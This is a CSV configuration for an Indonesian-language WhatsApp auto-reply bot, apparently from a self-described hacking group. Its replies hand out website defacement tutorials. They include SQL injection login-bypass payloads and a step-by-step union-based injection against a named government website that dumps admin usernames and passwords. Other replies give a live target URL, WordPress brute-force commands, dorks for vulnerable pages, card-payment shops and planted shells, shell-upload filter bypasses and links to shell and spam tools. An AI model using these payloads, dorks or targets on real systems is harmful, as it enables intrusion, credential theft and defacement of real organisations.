"received_message","pattern_matching","reply_message","multiple_replies","multiple_reply_delay","multiple_reply_delay_max","recipients","contacts","ignored_contacts","reply_delay","reply_delay_max","specific_times","monday","tuesday","wednesday","thursday","friday","saturday","sunday","pause_type","pause_value","disabled"
"p","none","P p P p P situ islam kan ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"menu","similar","<========================>\n   GRAYHAT TERSAKITI TEAM  \n      <><><><>BOT<><><><><>\n<========================>\n|> tentang bot\n|> subs rey\n|> arti sql\n|> arti bypass admin\n|> apa itu termux\n|> sql balitbang\n|> sql base64\n|> bypass admin\n|> dork bypass admin\n|> dork cc\n|> dork sql\n|> apk sandroproxy\n|> apk droidsqli\n|> apk bot\n|> apk spam wa\n|> minishell\n|> devace sql\n|> into out file\n|> devace wpbf\n|> devace regmem\n|> devace rce\n|> github grup\n|> dorking shell\n|> wa gb\n|> drupal hidden\n|> sadap wa\n<=======================>\n           Ã—   peringatan Ã—\n|>kata""harus sama di atas ajg !\n|>Tanda ini |> jangan lu ketik !\n<=======================>","all","","","b","","","","","0","","","","","","","","seconds","0","0"
"arti sql","none","Apa itu SQL Injection?\n\nSql injection adalah sebuah teknik hacking yang dilakukan dengan menyisipkan baris kode SQL pada kotak isian (misalnya form login) atau pada url yang mana serangan ini akan mempengaruhi logika dari website tersebut.\n\nSql injection memanfaatkan celah keamanan yang disebabkan karena masukan pengguna tidak disaring secara benar oleh aplikasi.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork sql","none","Dork SQL Fresh : \n\nhome.php?cat= item_book.php?CAT= www/index.php?page= schule/termine.php?view= goods_detail.php?data= storemanager/contents/item.php?page_code= view_items.php?id= customer/board.htm?mode= help/com_view.html?code= n_replyboard.php?typeboard= eng_board/view.php?T****= prev_results.php?prodID= bbs/view.php?no= gnu/?doc= zb/view.php?uid= global/product/product.php?gubun= m_view.php?ps_db= productlist.php?tid= product-list.php?id= onlinesales/product.php?product_id= garden_equipment/Fruit-Cage/product.php?pr= product.php?shopprodid= product_info.php?products_id= productlist.php?tid= showsub.php?id= productlist.php?fid= products.php?cat= products.php?cat= product-list.php?id= product.php?sku= store/product.php?productid= products.php?cat= productList.php?cat= product_detail.php?product_id= product.php?pid= view_items.php?id= more_details.php?id= county-facts/diary/vcsgen.php?id= idlechat/message.php?id= podcast/item.php?pid= products.php?act= details.php?prodId= socsci/events/full_details.php?id= ourblog.php?categoryid= mall/more.php?ProdID= archive/get.php?message_id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dork cc","none","Dork CC fresh\n\n\ninurl:â€.php?cid=â€ intext:â€shopâ€\nview_details.php?id=\ninurl:â€.php?cid=â€ intext:â€payment_optionâ€\ninurl:â€.php?cid=â€ intext:â€delivery_addressâ€\nProducts.php?id=\ndescription.php?id=\nproductlist.asp?catalogid=\ninurl:â€.php?cid=â€ intext:â€My_cartâ€\ninurl:â€.php?cid=â€ intext:â€Payment_Gatewayâ€\ninurl:â€.php?cid=â€ in poptext:â€Transaction_succesfullâ€\ninurl:â€.php?cid=â€ intext:â€shopingâ€\ninurl:â€.php?cid=â€ intext:â€otpâ€\ninurl:â€.php?cid=â€ intext:â€verifiedâ€\nYour_account_details.php?id=","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"kontol","none","Apa kontol gak senang ?","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"rey","none","Ya ada apa","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk droidsqli","none","https://www.mediafire.com/download/q7g49olglczofm4\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk bot","none","Hubungi Rey bila ingin mendapatkan apk bot\nWa.me/+62089513286355","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"minishell","none","https://www.mediafire.com/download/u9v8lvyhpnaqagy\nKlik anjeng","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"bypass admin","none","Tutorial Deface Bypass Admin Login \n\nHallo, Apa kabar?\n\n\nBypass Admin Login~Â Sebenarnya ini tidak jauh berbeda dan masih berhubungan denganÂ SQL Injection.Â Jika kita ketahui, bug ini memungkinkan seorang attacker untuk masuk sebagai admin hanya dengan memasukan username dan password contoh seperti or 1=1 tanpa harus repot-repot seperti halnya melakukan ekploitasi website.\n\n\n\n\nPengertianya cukup itu saja. Oiya buat yang masih belum mengerti atau pengen tahu yang lebih jelas, kenapa ini bisa terjadi? Lalu dimana letak kesalahan tersebut? Oke, saya sudah menyiapkan artikel sebagai referensi untuk bisa kamu baca mengenai hal ini, berikut linknya:\n\n\nBaca:Â Sekilas tentang SQLi Pada Form Login\n\n\nPayload Bypass Admin\n\nDari sekian banyak query yang bertebaran di internet, disini saya akan membagikan beberapa query yang sering saya gunakan untuk bypass admin login website, diantaranya sebagai berikut:\n\n\nadmin' #\nadmin' or '1'='1\nadmin' or '1'='1'#\nadmin' or 1=1 or ''='\n'or 1=1 limit 1 -- -+\n' or '1'='1\n' or 'x'='x\n' or 0=0 --\n' or 0=0 #\n' or 1=1--\n' or 'one'='one\n'or 1=1-- -\n/*12345'or 1=1 limit 1 -- -+*/\n'or''='\n\n\nHanya segitu? Iya cuma itu saja, payload bypass admin login tersebut saya gunakan dari awal saya mengenal/melakukan deface (2015) sampai sekarang (tapi sudah jarang sekali). Nah, jika kamu punya payload yang lain mungkin bisa di share pada kolom komentar biar teman-teman yang lain juga pada tahu.\n\n\nBaiklah tanpa berlama-lama, sekarang mari kita ke inti pokok pembahasan selanjutnya, lestgooo.\n\n\nTutorial Bypass Admin Login Website\n\nNah, apa saja yang diperlukan? Berikut diantaranya:\n\n\n1. Dork\n2. Shell Backdoor\n3. Script Deface\n\n\nPenjelasan:\n\nDork~ Jika tidak punya target kamu bisa mencari website yang terkait vulnerability bypass admin login dengan dork, contoh dork misalnya.\n\n\n""inurl:/admin/login.php""\n""inurl:/admin/login.php"" site:.id\n\n\nSelebihnya kamu kembangkan lagi ya biar bisa dapat yang fresh.\n\n\nShell Backdoor~ File backdoor ini berguna untuk edit, upload dan lain sebagainya.\n\n\nScript Deface~ Jika belum punya kamu bisa download script deface lewat pencarian Google atau kalo bisa ya lebih baik bikin sendiri saja.\n\n\nBaiklah dari apa yang sudah saya sebutkan (3 bahan) tadi, jika kamu sudah punya. Sekarang mari kita simak beberapa tutorial dibawah ini.\n\n\nPOC (Prof End Concept) Bypass Admin Login\n\nStep 1: Eksekusi Target\n\n\nHasil dari mencari target dengan dork, kurang lebih seperti ini target yang saya dapatkan.\n\n\nhttp://target.com/admin/index.php\n\n\nNah sekarang, tinggal mengeksekusi website tersebut bisa atau tidaknya saya dapat masuk ke dashboard panel admin dengan menggunakan payload yang tadi saya sebutkan diatas dan saya mencoba menggunakan payload yang admin' or 1=1 or ''='\n\n\nDisaat berada di dashboard panel admin login, kamu isikan username: admin' or 1=1 or ''=' password: admin' or 1=1 or ''='\n\n\n\n\nKemudian tinggal klik pada tombol Login website tersebut. Apabila berhasil kamu akan diarahkan menuju ke menu dashboard panel admin website tersebut, dan itu artinya kamu sudah bisa mengakses seluruh isi website.\n\n\n\n\nCatatan:Â Perlu di ingat, tidak semua form login admin website bisa di injeksi dengan cara seperti ini, jika gagal kemungkinan sudah di patch bugnya, kamu bisa coba payload yang lain atau cari target yang lainya saja.\n\n\nStep 2: Upload Shell\n\n\nJika kamu sudah berhasil masuk ke dashboard panel admin website target kamu itu artinya sekarang kamu sudah bisa upload shell, edit artikel dan lain sebagainya.\n\n\nLalu bagaimana caranya upload shell backdoor?\n\n\nTips:Â Jika kita tidak bisa upload shell backdoor dikarenakan form upload tersebut hanya memperbolehkan upload file berformatÂ "".jpg, .gif, .jpeg""Â kita bisa mengakalinya dengan bypass extensi shell tersebut. Contoh misalnya seperti iniÂ ""shell.php.jpg, shell.jpg.php, shell.jpg.PhP""Â dan lain sebagainya.","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace sql","none","tutorial deface sql injection\n\n\n\n\nPada Tutorial Kali ini ,Saya akan Share Tutorial Deface Sql Manual\n\ndork :Â \n\n- inurl:/staff.php?id=\n\n- inurl:/news.php?id=\n\nkembangin sendiri gan.\n\n\nNah Langsung Aja Karena Saya Udah Nemu Situs Yang Vuln Sql ,Oh iya Untuk Mengetahui Vuln Atau Tidak Kalian Hanya Perlu Masukan tanda ( ' ) di belakang angka Id nya, Contoh :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113' Nah Kek gitu deh, maka munculÂ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1\n\n\n\njika sudah ketemu ,kalian tinggal masukan +order+by+1--+- ,Jadinya :\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+-\n\nKalian Terusin Sampai Ketemu Error ,jadinya\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+1--+- => Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+2--+- Ga error\n\nhttp://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+3--+- Ga errorÂ \n\nSampai eror ya gan,Â \n\n\n\n\n\n\nNah disini saya eror di http://www.utama.tegalkab.go.id/artikel.php?id=113+order+by+9--+- Maka di Pastikan Table nya ada 8, Jika Sudah Gitu Kalian Tinggal ganti +order+by dengan +union+select,jangan lupa di kasih tanda (-) di depan angka id.\n\n\n\njadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+3--+- karena tadi table nya ada 8 http://www.utama.tegalkab.go.id/artikel.php?id=1+union+select+1,2,3,4,5,6,7,8--+- .Maka Akan Terlihat angka Ajaib Nya.\n\n\n\n\nSaya akan pilih Angka Dua Aja Biar Mesra wkwkwk.Sekarang Kita masukan inject nya .\ninject : (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)\nMasukan Pas di angka yang muncul Tadi ,\n\n\nJadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),3,4,5,6,7,8,9,10--+- Nah Disini Kalian Akan Lihat Banyak Table Table, Carilah Table Yang ada username dan password nya, kalo gak admin.\n\n\n\n\nNah Jika Sudah Lihat, Kalian Tinggal Dump istilahnya, Atau Buka Table Caranya Dengan Masukan Inject : /*!50000(SELECT+GROUP_CONCAT(username,0x3a,password+SEPARATOR+0x3c62723e)+FROM+utenti)*/Â \n\n\nDisini user dan password saya di Table admin.dan nama table adminnya admin_username. dan passwordnya admin_password. Jadi kalian edit inject nya jadi : /*!50000(SELECT+GROUP_CONCAT([user_id],0x3a,[user_pw]+SEPARATOR+0x3c62723e)+FROM+[securityTab])*/\n\nYang Saya Tandai [ ] Yang Harus Kalian Ganti.\n\n\nMaka Jadinya : http://www.utama.tegalkab.go.id/artikel.php?id=-1+union+select+1,/*!50000(SELECT+GROUP_CONCAT(admin_username,0x3a,admin_password+SEPARATOR+0x3c62723e)+FROM+admin)*/,3,4,5,6,7,8,9,10--+-\n\nNanti Saat Kalian Buka ,Akan Muncul user + password .\n\nÂ  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â \n\nTinggal kalian cari admin login nya hohoho :v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace wpbf","none","Bahan-bahan\n1.face Gans\n2.hp,laptop,pc\n3.termux atau kali linux\n4.kuota ajg :v\n5.dork :intitle:/my blog my wordpress blog\n\nOke\nLanjut ketik script wpbf ini di terminal anda\npkg install git\npkg install python2\npkg install python2\ngit clone https://github.com/reyspeed/wpbf\ncd wpbf\npython2 wpbf.py -u https://target.com/wp-login.php -u admin -P pass.txt\n\nTidak semua user admin ya tod jadi untuk liat user web nya klean bisa tulis gini site.co.li/?author=1 nah biasanya muncul user web nya,,ok setelah bruteforce nanti pasword nya muncul","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"github grup","none","github.com/reyspeed\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"apk spam wa","none","https://m.apkpure.com/id/labalabi-for-whatsapp/labalabi.whatsapp/download-apk-info\n\nKlik ajg","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"devace regmem","none","Tutorial Deface PoC Bypass Admin + Tebas Index\n\nYa kembali lagi dengan saya Mr.SkyCoDe kali ini saya akan share tutorial deface poc Bypass admin + tebas index\n\nSebelumnya saya sudah menjelaskan apa itu deface maka langsung simak aja ya\n\nBahan :\n\n- Shell Backdoor\n\n- Script Deface\n\n- Dork :\n\n* inurl:/admin.php Â intext:login intext:adminsitratorÂ \n\n* inurl:/admin/index.php site:.Â \n\n* inurl :/admin/Admin.php intext:loginÂ \n\n* inurl:/administrator/login.php site:.Â \n\n* inurl:/login.php intext:administratorÂ \n\n* inurl:/admin/login.php\n\n* inurl:/admin/login.php site:gov.my (atau apalah kreasikan sendiri) Use your brain ya seterusnya :'vÂ \n\n- kesabaran :vÂ \n\nLangsung sajaÂ  Kalian harus dorking di goggle missal\n\nDork : inurl:/admin/login.php site:inÂ \n\nPilih salah satu web gue baik guee kasih live target :V https://www.drhelpdesk.in/admin/\n\nIsi username sama pw nyaÂ  â€˜=â€™â€™orâ€™Â  Jika gagal login berarti web tersebut tidak vuln bypass admin (cari lagi:v)Â  Jika berhasil maka akan di arahkan ke dashboard admin:v Jika sudah masuk ke dashboard admin cari tempat upload biasa nya di add news atau upload imageÂ  Tinggal upload shell nya lalu klik upload atau submit :DÂ \n\nT E R U P L O A D >:(Â \n\nJika sudah upload shell nya tinggal panggil :D caranya klik kanan gambar rusak view image atau klo android tekan gambar ygÂ  rusak view image atau copy url image :vÂ  Kalo Sudah berhasil, masuk ke shell nya :DÂ \n\n1. Sekarang tinggal tebas index caranya tinggal ke public_htmlÂ \n\n2. Cari Index.php atau Index.htmlÂ \n\n3. Lalu klik edit lalu klik okeÂ \n\n4. Hapus semua lalu ganti dengan script deface kalianÂ \n\n6. Lalu klik go atau save Mari kita lihat indexnya :DÂ  cara nya = www.namasite.col.mek Tutorial Bypass Admin + Tebas Index:v","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"dorking shell","none","DEVACE MENGGUNAKAN DORKING SHELL\n\nBahanÂ²:\n1.Dork\n-intitle:index of cgi.php intext:""64k""\n-intitle:index of zoz.php intext:""64k""\n2.Shell\n3.Akses internet\n4.Hp/Pc\n5.Pacar,Oiya saiya kan joned:'(Â \n6.Kopi dan roko biar paruÂ² selalu smile:)\n\nLangkahÂ²:\n1.kalian dorking dlu ya gaes menggunakan dork yang diatas tadi dan kembangkan sesuai isi otak kalian:v\n\n2.kalo sudah kalian cari target nya gaes dan saya sudah nemu disini\n\n\n\n3.lalu kalian masuk ke target kalian kalo hoki kalian bisa nemu yg udah di tanem shell \n\n\n\n4.langsung saja kalian tebas ya gaes karna saya pengen nikung dlu jadi saya upload shell saya disitu lalu ganti menggunakan shell kalian\n\n\n5.lalu kalian cari index.php nya dan edit dan ganti isi nya menggunakan script deface kalian,karna di target saya gaada index.php nya jadi saya upload aja sendiri dan isi dalam nya script saya\n\n6.kalo sudah kalian save lalu tinggal panggil saja hasil tebas dan done ^_^\n\n7.oke cukup sampe disini saja","single","","","b","","","","","0","","","","","","","","seconds","0","0"
"tentang bot","none","Bot ini khusus di buat untuk keperluan belajar hacking oleh author yaitu Rey","single","","","b","","","","","0","","","","","","","","seconds","0","0"
